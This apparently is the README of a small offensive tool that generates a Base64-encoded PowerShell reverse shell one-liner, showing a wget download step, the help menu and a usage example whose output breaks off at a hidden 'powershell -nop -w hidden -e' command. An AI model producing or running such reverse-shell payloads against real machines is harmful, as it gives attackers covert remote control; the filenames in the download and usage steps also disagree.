A simple Python script to generate a Base64 encoded PowerShell reverse shell one-liner.

Download:

```bash
wget https://raw.githubusercontent.com/tm-security/encoded-ps-rev/main/encoded-ps-rev.py && chmod +x ./encoded-ps-rev.py
```

Help menu:

```bash
./ps-revshell-b64.py -h
usage: ps-revshell-b64.py [-h] -t TARGET [-p PORT]

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target IP
  -p PORT, --port PORT  target port [defalt 4444]
```

Usage:

```bash
./ps-revshell-b64.py -t 192.168.1.2 -p 9000

(+) Generating payload for 192.168.1.2:9000

powershell -nop -w hidden -e 
```
